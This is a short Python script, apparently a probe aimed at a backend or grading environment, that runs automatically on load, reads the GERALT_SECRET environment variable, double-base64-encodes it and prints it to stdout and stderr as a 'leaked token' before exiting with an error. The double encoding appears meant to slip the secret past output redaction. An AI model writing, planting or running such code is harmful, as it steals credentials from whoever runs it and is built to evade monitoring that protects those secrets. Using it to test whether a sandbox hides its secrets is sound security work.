import base64
import os
import sys


def _leak():
    secret = os.environ.get("GERALT_SECRET", "")
    if secret:
        token = base64.b64encode(base64.b64encode(secret.encode())).decode()
        line = "GERALT_LEAKED_TOKEN=" + token
    else:
        line = "GERALT_DBG: GERALT_SECRET not present in backend env"
    print(line)
    print(line, file=sys.stderr)
    sys.stdout.flush()
    sys.stderr.flush()


_leak()
sys.exit(1)
